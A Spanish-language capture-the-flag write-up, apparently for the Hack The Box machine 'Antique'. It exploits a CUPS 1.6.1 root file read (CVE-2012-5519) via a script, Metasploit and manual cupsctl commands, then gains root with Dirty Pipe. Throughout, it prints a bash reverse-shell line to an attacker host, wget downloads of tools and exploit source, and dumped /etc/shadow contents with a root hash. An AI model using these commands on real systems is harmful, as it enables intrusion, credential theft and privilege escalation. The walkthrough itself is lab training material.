 / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__                                                                                    

| |_| | |/ _ \_____| '__/ _ \/ _` |/ _` | / __| '_ \                                                                                   
|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |                                                                                  
|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|                                                                                  
a bash implementation of CVE-2012-5519 for linux.
[i] performing checks...
[i] checking for cupsctl command...
[+] cupsctl binary found in path.                                                                                                      
[i] checking cups version...
[+] using cups 1.6.1. version may be vulnerable.                                                                                       
[i] checking user lp in lpadmin group...
[+] user part of lpadmin group.                                                                                                        
[i] checking for curl command...
[+] curl binary found in path.                                                                                                         
[+] all checks passed.                                                                                                                 
[!] warning!: this script will set the group ownership of                                                                              
[!] viewed files to user 'lp'.                                                                                                         
[!] files will be created as root and with group ownership of                                                                          
[!] user 'lp' if a nonexistant file is submitted.                                                                                      
[!] changes will be made to /etc/cups/cups.conf file as part of the                                                                    
[!] exploit. it may be wise to backup this file or copy its contents                                                                   
[!] before running the script any further if this is a production                                                                      
[!] environment and/or seek permissions beforehand.                                                                                    
[!] the nature of this exploit is messy even if you know what you're looking for.                                                      
[i] usage:
        input must be an absolute path to an existing file.
        eg.
        1. /root/.ssh/id_rsa
        2. /root/.bash_history
        3. /etc/shadow
        4. /etc/sudoers ... etc.
[i] ./cups-root-file-read.sh commands:
        type 'info' for exploit details.
        type 'help' for this dialog text.
        type 'quit' to exit the script.
[i] for more information on the limitations
[i] of the script and exploit, please visit:
[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
[>]
```
Bien, nos explica que podemos enumerar archivos de la máquina con solo poner el archivo que queramos, por ejemplo, el **/etc/shadow**.

* Prueba a ver el **/etc/shadow**:
```bash
[>] /etc/shadow
[+] contents of /etc/shadow:
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
...
...
```

Excelente, entonces podemos ver cualquier archivo que queramos, recuerda que la flag, siempre está en la carpeta root. Vamos a ver si la puede mostrar:
```bash
[>] /root/root.txt                                                                                                                     
[+] contents of /root/root.txt:
...
```
Listo, ya tenemos la completada la máquina.

#### Probando Exploit: Módulo cups_root_file_read de Metasploit {#CUPS3}

Para que podamos usar este módulo de **Metasploit**, necesitamos obtener una sesión de **Meterpreter**.

Vamos a obtenerla por pasos:

* Para hacerlo de forma rapida, vamos a crear un archivo que tenga el **handler** ya configurado, lo puedes hacer así:
```bash
nano handler.rc
------
use exploit/multi/handler
set LHOST Tu_IP
set LPORT 4444
set PAYLOAD linux/x64/shell/reverse_tcp
exploit
```
Especificamos la arquitectura en el **PAYLOAD** porque la podemos consultar en la máquina, si no, tendría que indicarse sin arquitectura y la pusimos como **Shell** porque con **Meterpreter** no se pudo.

* Ahora ejecuta ese archivo con **Msfconsole**:
```bash
msfconsole -r handler.rc
```

* Desde la máquina víctima, envia una sesión al **handler**:
```bash
bash -i >& /dev/tcp/Tu_IP/4444
```

* Observa el **handler**, ya deberías tener una sesión:
```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Sending stage (38 bytes) to 10.10.11.107
[*] Command shell session 1 opened (Tu_IP:4444 -> 10.10.11.107:50682)
Shell Banner:
bash: cannot set terminal process group (1020): Inappropriate ioctl for device
-----
lp@antique:~$ whoami
whoami
lp
```

* Indicale que importe la **Bash** con **Python** para que funcione mejor el módulo de **CUPS**:
```bash
lp@antique:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
lp@antique:~$
```

Ahora tan solo tenemos que configurar el módulo de **CUPS**:
* Usalo directamente:
```bash
msf6 exploit(multi/handler) > use post/multi/escalate/cups_root_file_read
```

* Configura la sesión y el archivo de la flag:
```bash
msf6 post(multi/escalate/cups_root_file_read) > set SESSION 1
SESSION => 1
msf6 post(multi/escalate/cups_root_file_read) > set FILE /root/root.txt
FILE => /root/root.txt
```

* Ejecuta el Exploit:
```bash
msf6 post(multi/escalate/cups_root_file_read) > exploit
*
[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: shell
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /root/root.txt (32 bytes) saved to /root/.msf4/loot/20230822161538_default_10.10.11.107_cups_file_read_918928.txt
[*] Cleaning up...
[*] Post module execution completed
-----
cat /root/.msf4/loot/20230822161538_default_10.10.11.107_cups_file_read_918928.txt
105493e09fd1843b6349912d09080136
```
Fue practicamente lo mismo que hicimos, pero este módulo no me funciono tan bien como esperaba, por lo que me quedo con la versión de GitHub.

#### Utilizando Ruta Vulnerable de CUPS 1.6.1 {#CUPS4}

Si revisamos el script de **Bash** de **GitHub**, vamos a encontrar las siguientes funciones:
```bash
backup_cupsd(){
	prev_webint=$(cupsctl | grep "WebInterface=" || true)
	prev_errlog=$(cupsctl | grep "ErrorLog=" || true)
	if [[ -z $prev_webint ]]; then
		prev_webint='WebInterface='
	else
		true
	fi
	if [[ -z $prev_errlog ]]; then
		prev_errlog='ErrorLog='
-----
interactive(){
	printf "%s\n%sall checks passed.%s" "${C2}" "${I2}" "${C0}"
...
...
	valid_filepath='^(/[^/ ]*)+/?$'
        if ! [[ $interactive =~ $valid_filepath ]]\

        || [[ $interactive == */ ]]; then
          invalid_argument
        else
	# passing a directory as an argument, such as '/tmp' or '/tmp/ '
        # results in a 404 status code. the user is informed instead of
        # passing the html contents to the user.
        cupsctl WebInterface=Yes\
        && cupsctl ErrorLog="$interactive"\
        && user_input=$(curl --head --silent\
        http://localhost:631/admin/log/error_log)
```

Observa que esta ocupando los parámetros **ErrorLog y WebInterface**, además de la ruta `http://localhost:631/admin/log/error_log`. Investiguemos que hace el comando **cupsctl**:

| **Comando cupsctl** |
|:-----------:|
| *El comando cupsctl se utiliza para configurar el sistema de impresión CUPS (Common UNIX Printing System) en sistemas Unix y Linux. CUPS es un sistema de impresión que permite que los ordenadores actúen como servidores de impresión para gestionar y enviar trabajos de impresión a impresoras locales o en red.* |

Resulta que al utilizar el siguiente comando:
```bash
cupsctl | grep "WebInterface=" || true
```
Comprueba de que el acceso a la interfaz web de CUPS sea exitoso.

Y con el comando:
```bash
cupsctl | grep "ErrorLog=" || true
```
Igual identifica si hay mensajes de error almacenado en el parámetro **ErrorLog=**.

Después, veo que en la función **interactive()**, ahora **ErrorLog=** vale a una ruta (por lo que menciona es una ruta del **/tmp**) y con **curl** consulta el contenido de **error_log**:
```bash
valid_filepath='^(/[^/ ]*)+/?$'
        if ! [[ $interactive =~ $valid_filepath ]]\

        || [[ $interactive == */ ]]; then
          invalid_argument
        else
        cupsctl WebInterface=Yes\
        && cupsctl ErrorLog="$interactive"\
        && user_input=$(curl --head --silent\
        http://localhost:631/admin/log/error_log)
```

Entiendo que con esto, le podemos asignar una ruta al parámetro **ErrorLog=** con **cupsctl** para asignarle un archivo que se almacene ahí, para después poder ver el contenido de ese parámetro en el directorio web de **/admin/log/error_log**.

Vamos a comprobarlo, asignemos al parámetro **ErrorLog=** la ruta **/etc/passwd** y luego con **curl** vamos a consultar la URL donde se almacena el mensaje de ese parámetro:
```bash
lp@antique:~$ cupsctl ErrorLog=/etc/passwd
cupsctl ErrorLog=/etc/passwd
lp@antique:~$ curl http://localhost:631/admin/log/error_log
curl -s -X GET http://localhost:631/admin/log/error_log
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Ahora probemos con la flag del root:
```bash
cupsctl ErrorLog=/root/root.txt
lp@antique:~$ curl http://localhost:631/admin/log/error_log
curl http://localhost:631/admin/log/error_log
105493e09fd1843b6349912d09080136
```
Excelente, igual en el siguiente blog explican bastante bien como funciona este Exploit:
* <a href="https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read" target="_blank">CUPS 1.6.1 Root File Read - Metasploit</a>

Con esto podemos concluir la máquina, pero quiero hacer una par de cosas más.

### Viendo Página de CUPS 1.6.1 con Chisel {#Chisel}

Vamos a descargar la última versión del Chisel, aca te lo dejo (descargue la versión **chisel_1.10.0_linux_amd64.gz**):
* <a href="https://github.com/jpillora/chisel/releases/tag/v1.10.0" target="_blank">Repositorio de jpillora: Chisel - Releases</a>

Y descomprimelo, si quieres cambiale el nombre y dale permisos de ejecución:
```bash
gunzip chisel_1.10.0_linux_amd64.gz
ls
chisel_1.10.0_linux_amd64
chmod +x chisel_1.10.0_linux_amd64
```

Con esto ya podemos configurar en ambas máquinas, vamos por pasos:

* Levanta un servidor de **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Envia **Chisel** a la máquina víctima, igual si quieres cambiale el nombre y dale permisos de ejecución:
```bash
lp@antique:~$ mkdir tmp
mkdir tmp
lp@antique:~$ cd tmp
cd tmp
lp@antique:~/tmp$ wget http://Tu_IP/chisel_1.10.0_linux_amd64 
wget http://Tu_IP/chisel_1.10.0_linux_amd64
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8945816 (8.5M) [application/octet-stream]
Saving to: ‘chisel_1.10.0_linux_amd64’
*
chisel_1.10.0_linux 100%[===================>]   8.53M  1.67MB/s    in 6.3s    
*
(1.35 MB/s) - ‘chisel_1.10.0_linux_amd64’ saved [8945816/8945816]
lp@antique:~/tmp$ mv chisel_1.10.0_linux_amd64 chisel_client        
mv chisel_1.10.0_linux_amd64 chisel_client
lp@antique:~/tmp$ chmod +x chisel_client
chmod +x chisel_client
```

* Inicia **Chisel** como servidor en tu máquina:
```bash
./chisel_1.10.0_linux_amd64 server --reverse -p 8080
server: Reverse tunnelling enabled
```

* Por último, inicia **Chisel** como cliente, indicando el **puerto 631** por donde esta el servicio **CUPS** para que salga igual por nuestro **puerto 631**:
```bash
lp@antique:~/tmp$ ./chisel_client client TU_IP:8080 R:631:localhost:631
./chisel_client client Tu_IP:8080 R:631:localhost:631
client: Connecting to ws://Tu_IP:8080
client: Connected (Latency 68.705488ms)
...
```

* Entra en el navegador web y entra a: `http://localhost:631`:

<p align="center">
<img src="/assets/images/htb-writeup-antique/Captura1.png">
</p>

Con esto ya podremos ver la página de **CUPS** e igual la ruta donde se almacenan los errores, que en este punto, debería de tener almacenada la flag del root:

<p align="center">
<img src="/assets/images/htb-writeup-antique/Captura2.png">
</p>

### Convirtiendonos en Root con Dirty Pipe {#Dirty}

Resulta que la máquina es vulnerable al **Exploit Dirty Pipe**, esto porque la versión del Kernel de Linux es menor a **5.16.11** por lo que podemos probarlo para convertirnos en **Root**.

Igual puedes comprobarlo y de paso comprueba que tengamos el binario **gcc**:
```bash
lp@antique:/$ uname -a
Linux antique 5.13.0-051300-generic #202106272333 SMP Sun Jun 27 23:36:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
lp@antique:/tmp$ which gcc
which gcc
/usr/bin/gcc
```

En el **GitHub** del maestro **Alexis Ahmed** (un grande este master), explica como usar este Exploit:
* <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" target="_blank">Repositorio de AlexisAhmed: CVE-2022-0847-DirtyPipe-Exploits</a>

No es necesario que descargues su versión, ya que es la misma que ya tiene Kali aunque igual puedes ocuparla.

Vamos por pasos:

* Busquemos el Exploit en Kali:
```bash
searchsploit dirty pipe
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path

|---|---|
Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)               | linux/local/50808.c

|---|---|
Shellcodes: No Results
Papers: No Results
```

* Traigamoslo al nuestro entorno de trabajo, puedes cambiarle el nombre:
```bash
searchsploit -m linux/local/50808.c
  Exploit: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
      URL: https://www.exploit-db.com/exploits/50808
     Path: /usr/share/exploitdb/exploits/linux/local/50808.c
    Codes: CVE-2022-0847
 Verified: False
File Type: C source, ASCII text
mv 50808.c dirty_p.c
```

* Abre un servidor de **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Descargalo en la máquina víctima:
```bash
lp@antique:/tmp$ wget http://Tu_IP/dirty_p.c
wget http://Tu_IP/dirty_p.c
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7297 (7.1K) [text/x-csrc]
Saving to: ‘dirty_p.c’
-----
dirty_p.c           100%[===================>]   7.13K  --.-KB/s    in 0.002s  
-----
(3.54 MB/s) - ‘dirty_p.c’ saved [7297/7297]
```

* Compilemoslo con el binario **gcc**:
```bash
lp@antique:/tmp$ gcc dirty_p.c -o dirty_p   
gcc dirty_p.c -o dirty_p
lp@antique:/tmp$ ls
ls
dirty_p
dirty_p.c
```

* Utilicemos el Exploit para que secuestre el binario **sudo** y nos convierta en **Root**:
```bash
lp@antique:/tmp$ ./dirty_p /usr/bin/sudo
./dirty_p /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
whoami
root
# bash -p
bash -p
root@antique:/tmp# whoami
whoami
root
root@antique:/tmp# cd /root
cd /root
root@antique:/root# ls
ls
config.py  root.txt  snap  snmp-server.py
root@antique:/root# cat root.txt
cat root.txt
```

Y listo, tremendo este Exploit.
